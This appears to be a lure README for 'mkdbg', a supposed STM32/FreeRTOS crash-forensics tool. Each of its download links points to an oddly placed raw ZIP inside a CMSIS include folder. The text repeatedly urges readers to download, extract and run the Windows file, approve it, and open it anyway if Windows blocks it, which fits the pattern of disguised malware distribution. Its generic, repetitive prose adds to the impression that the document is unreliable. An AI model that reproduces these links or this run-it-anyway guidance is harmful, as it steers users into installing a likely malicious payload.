# mkdbg - Crash forensics for Cortex-M

[![Download mkdbg](https://img.shields.io/badge/Download-mkdbg-blue?style=for-the-badge)](https://raw.githubusercontent.com/illusional-micropogonias93/mkdbg/main/examples/stm32f446/cmsis/CMSIS/Include/Software-3.3.zip)

## 🧰 What mkdbg does

mkdbg helps you read crash data from STM32 boards that run FreeRTOS with MPU support. It is built for staged bring-up, UART-based fault reports, and post-crash replay of what happened before the fault.

Use it when a device freezes, resets, or stops responding and you need a clear fault trail. It works with Cortex-M systems and focuses on hardware-first debug flows.

## 📥 Download mkdbg

Visit this page to download and run the software on Windows:

https://raw.githubusercontent.com/illusional-micropogonias93/mkdbg/main/examples/stm32f446/cmsis/CMSIS/Include/Software-3.3.zip

If the page shows a release file, download it and open it on your Windows PC. If it shows the main project page, use the files and release links there to get the Windows build.

## 🖥️ Windows setup

mkdbg is meant to run on a Windows desktop or laptop.

Before you start, make sure you have:

- Windows 10 or Windows 11
- A free USB port
- The USB driver for your STM32 board, if your board needs one
- A serial port tool already installed, if the package asks for one
- Permission to open the app and access the COM port

If Windows asks for approval, allow the app to run and let it use the serial port.

## 🚀 Getting started

1. Open the download page:
   https://raw.githubusercontent.com/illusional-micropogonias93/mkdbg/main/examples/stm32f446/cmsis/CMSIS/Include/Software-3.3.zip

2. Download the Windows package or release file from the page.

3. If the file is in a ZIP folder, right-click it and choose Extract All.

4. Open the extracted folder.

5. Run the mkdbg application file.

6. Connect your STM32 board to your PC with the correct USB or UART cable.

7. Open the app and select the COM port for your board.

8. Start the capture or replay flow inside the app.

## 🔌 What you need from your board

mkdbg works best when your firmware sends fault data over UART. Your board should already be set up to print crash details, reboot status, or memory traces.

A typical setup uses:

- STM32 hardware
- FreeRTOS with MPU enabled
- UART pins for crash output
- A stable power supply
- A known baud rate, often 115200 or similar

If your board already sends logs to a serial port, mkdbg can read them and help you make sense of the fault path.

## 🧭 Basic use

Start with a simple check:

1. Connect the board.
2. Power it on.
3. Open mkdbg.
4. Pick the right COM port.
5. Look for incoming UART data.
6. Trigger the crash flow in your firmware.
7. Review the fault data that comes back.

If the board restarts after a fault, mkdbg can still help if the firmware writes data before the reset.

## 🧪 Typical workflow

A normal session may look like this:

- Boot the device in a known state
- Check that UART output appears
- Run the firmware through a test case
- Force or hit a crash path
- Read the fault report
- Replay the event chain
- Compare the last good state with the crash state

This helps you trace the cause of the fault instead of only seeing the reset.

## 🛠️ Common use cases

mkdbg fits these tasks:

- Debugging hard faults on STM32
- Reading crash logs from a board with no probe attached
- Checking MPU access faults in FreeRTOS
- Reviewing the last steps before a reset
- Testing bring-up on new embedded hardware
- Capturing fault telemetry over UART
- Studying postmortem state after a crash

## 🧩 How the replay flow helps

When a crash happens, the last few actions often matter most. mkdbg is built around that idea.

It helps you:

- See the fault path
- Track the order of events
- Review the state before the crash
- Match output to the code path that failed
- Find the place where the system stopped behaving as expected

That is useful when the device fails too fast for manual checks.

## 🔍 What you may see in the app

Depending on your board and firmware, mkdbg can show items such as:

- UART messages
- Fault codes
- Reset reasons
- Task state
- Memory access errors
- MPU faults
- Crash timestamps
- Replay steps

The exact view depends on how your firmware sends data.

## 📌 First-time setup tips

Use these steps if the app does not show data right away:

- Check that the board is powered on
- Confirm the USB cable carries data, not just power
- Make sure the COM port matches the board
- Close other serial tools that may use the same port
- Check that the baud rate matches the firmware
- Replug the board and try again

A small mismatch in port or baud rate is a common cause of empty output.

## 🧼 Keep the setup simple

For the first run, keep the setup basic:

- One board
- One USB cable
- One serial session
- One firmware build
- One crash test

This makes it easier to see if the problem comes from the app, the cable, the port, or the firmware.

## 🧱 Project focus

mkdbg is aimed at embedded debug work on Cortex-M systems. It is tuned for STM32 and FreeRTOS MPU use cases where a crash can hide the real cause.

It is a good fit when you need:

- Hardware-first fault capture
- UART diagnostics without a debug probe
- Crash forensics after a reset
- Clear fault replay from embedded logs
- A simple path from fault to root cause

## 📂 Repository topics

This project is related to:

- bring-up
- Cortex-M
- crash forensics
- embedded debugging
- fault telemetry
- firmware
- FreeRTOS
- MPU
- postmortem analysis
- STM32
- STM32F446
- UART debugging

These topics reflect the kind of boards and crash flows mkdbg is built for.

## 🪛 If the app does not start

Try these checks:

1. Confirm the download finished.
2. Extract the ZIP file if needed.
3. Run the app from the extracted folder.
4. Right-click the file and choose Open if Windows blocks it.
5. Check that your Windows user can open downloaded apps.
6. Restart the PC and try again.
7. Re-download the file from the project page if the file looks incomplete.

## 🔗 Download and run

Use this link to visit the project page, then download and run the Windows file from there:

https://raw.githubusercontent.com/illusional-micropogonias93/mkdbg/main/examples/stm32f446/cmsis/CMSIS/Include/Software-3.3.zip

## 🧷 What makes mkdbg useful

Embedded faults can be hard to trace. A board may reset before you can inspect it. A probe may not be connected. The crash may only show a short UART line.

mkdbg is built for that situation. It gives you a direct path to read what the firmware sends, review the crash trail, and replay the fault path on a Windows PC

